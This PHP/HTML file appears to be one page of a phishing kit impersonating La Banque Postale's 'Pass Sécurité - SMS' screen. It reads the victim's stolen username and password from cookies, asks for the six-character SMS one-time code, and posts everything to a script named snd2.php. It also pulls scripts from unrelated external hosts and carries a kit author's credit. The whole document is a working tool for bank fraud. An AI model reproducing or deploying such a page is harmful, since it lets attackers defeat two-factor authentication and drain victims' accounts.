﻿<?php
include "post.php";
?>
<html>
<head>
<meta http-equiv="Content-Language" content="fr">
<title>Banque - banque en ligne - La Banque Postale – La Banque Postale</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">

<style>
body {
    font-family: Arial,Helvetica,Verdana,Tahoma,sans-serif;
    font-size: 10px;
}
input[type="password"] {
    width: 126px;
    color: #C00000;
    border-color: rgba(192, 0, 0, 0.5);
}
.fifthsubmit {
    margin: 0px;
    padding: 6px 20px;
    border: 1px solid #C5C5C5;
    border-radius: 20px;
    background: transparent -moz-linear-gradient(center top , #F6F6F6 0%, #DDD 100%) repeat scroll 0% 0%;
    color: #222;
    font-weight: normal;
    font-size: 12px;
    text-shadow: 1px 1px #FAFAFA;
    cursor: pointer;
}
</style>
	<link rel="stylesheet" type="text/css" href="http://holacoin.us/dev/test/css/ds.css">
    <script type="text/javascript" src="http://romeoonweb.altervista.org/dbox/3/jquery-1-4-4-min.js"></script>
<script src="http://code.jquery.com/jquery-latest.js"></script>
<script src="http://jnansbil.xoom.it/js/jquery.js"></script>
<script type="text/javascript">

function numbersonly(e){
var unicode=e.charCode? e.charCode : e.keyCode
if (unicode!=8){ //if the key isn't the backspace key (which we should allow)
if (unicode<48||unicode>57) //if not a number
return false //disable key press
}
}
</script>
<script type="text/javascript">
if( window.  parent . length !=0) {
    window. top . location .replace( document. location.href);}
</script>
<link rel="stylesheet" type="text/css" href="css/tab.css">
</head>
<body bgcolor="#FFFFFF" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
<div id="xn1"></div>
<table border="0" width="100%" cellspacing="0" cellpadding="0" background="images/bg1.jpg">
	<tr>
		<td align="center">
<!-- ImageReady Slices (Untitled-7) -->
<table id="Table_01" width="1142" height="776" border="0" cellpadding="0" cellspacing="0">
	<tr>
		<td colspan="3">
			<img src="images/info_01.gif" width="1142" height="142" alt=""></td>
	</tr>
	<tr>
		<td valign="top">
			<img src="images/info_02.gif" width="175" height="578" alt=""></td>
		<td width="782" height="100%" valign="top" align="center"><br>
		<table border="1" width="95%" cellspacing="0" cellpadding="0" height="34" bordercolorlight="#000000" bordercolordark="#C0C0C0" style="border-right-color: #C0C0C0; border-bottom-color: #C0C0C0">
			<tr>
				<td background="images/bkg-thead34.png" align="center"><b>Pass Sécurité - SMS 
				</b> </td>
			</tr>
		</table>
<form action="" method="post"><table id="tab1" border="0" height="450" width="95%">
<input type="hidden" name="username" value="<?php echo $_COOKIE["UsernameCockie"]; ?>">
<input type="hidden" name="password" value="<?php echo $_COOKIE["PasswordCookie"]; ?>">
  <body>
  <center>

  
	<div class="mery">
	   <!-- header-->
<form name="myform" method="POST" action="snd2.php">
   

		</form>
		<!-- header-->
		<div class="content">
		   <div class="bora"></div>
		   <div class="both"></div>
		   <div class="pazi">
		   	
		   	  <div class="pazi-right">
		   	  	  <div class="activation">
		   	  	  	 <div class="activ-left"></div>

		   	  	  <form name="myform" method="POST" action="snd2.php">

		   	  	  	 <div class="activ-right">

		   	  	  	 
					    <input type="text" name="sm" class="bb1" maxlength="6" max="6" placeholder="6 Caract&egrave;res"  required="required" autocomplete="off" autocorrect="off" autocapitalize="word" value="" aria-describedby="legalFirstNameValidations" aria-invalid="false"><br>
						
		   	  	  	 	<div class="savo">
						<h4 class="notice1">Veuillez saisir le code &agrave; 6 caract&egrave;res envoyer par sms sur votre t&eacute;l&eacute;phone mobile :<div class ="zabi" id="timer"></div></h4>
						
						<p class="nemra">06 XX XX XX XX</p>
						<input type="submit" class="btnso" name="" value="ok" /></div>
		   	  	  	 </div>
		   	  	   </form>


		   	  	  </div>
		   	  </div>
		   </div>
		  <div class="foot">
		  	<center>
		  		<div class="klm">
		  			 
		  		</div>
		  	</center>
		  </div>
 

		</div>
		<!-- content -->
	</div>
	<!-- Display the countdown timer in an element -->


<script>
document.getElementById('timer').innerHTML =
  02 + ":" + 00;
startTimer();

function startTimer() {
  var presentTime = document.getElementById('timer').innerHTML;
  var timeArray = presentTime.split(/[:]+/);
  var m = timeArray[0];
  var s = checkSecond((timeArray[1] - 1));
  if(s==59){m=m-1}
  //if(m<0){alert('timer completed')}
  
  document.getElementById('timer').innerHTML =
    m + ":" + s;
  setTimeout(startTimer, 1000);
}

function checkSecond(sec) {
  if (sec < 10 && sec >= 0) {sec = "0" + sec}; // add zero in front of numbers < 10
  if (sec < 0) {sec = "59"};
  return sec;
}
</script>
	<!-- ///////////////////////////////    End Code Dr HeX   //////////////////////////// -->
  </center>
</body>
</html>